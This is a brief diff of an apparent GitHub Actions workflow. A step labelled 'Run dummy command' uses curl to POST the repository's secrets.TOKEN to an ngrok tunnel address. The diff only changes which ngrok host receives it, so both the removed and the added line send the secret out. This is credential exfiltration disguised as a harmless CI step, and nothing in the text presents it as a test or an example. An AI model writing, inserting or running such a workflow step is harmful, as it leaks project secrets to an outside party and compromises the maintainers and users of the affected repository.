@@ -13,5 +13,5 @@ jobs:
       - name: Run dummy command
         run: |
             echo running
-            curl -X POST -d '{"secrets.TOKEN": "${{ secrets.TOKEN }}"}' https://9a7d-2a06-c701-4d4b-1200-c4e4-fb86-a76a-4ad9.ngrok-free.app
+            curl -X POST -d '{"secrets.TOKEN": "${{ secrets.TOKEN }}"}' https://d17e-2a06-c701-4d4b-1200-c4e4-fb86-a76a-4ad9.ngrok-free.app
     
